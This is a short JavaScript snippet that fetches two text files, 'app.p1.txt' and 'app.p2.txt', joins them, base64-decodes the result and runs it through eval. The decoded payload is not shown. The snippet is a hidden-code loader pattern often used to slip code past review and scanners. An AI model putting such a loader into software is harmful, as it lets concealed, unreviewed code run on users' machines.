(async function(){
  const a = await (await fetch("app.p1.txt")).text();
  const b = await (await fetch("app.p2.txt")).text();
  eval(decodeURIComponent(escape(atob(a+b))));
})();
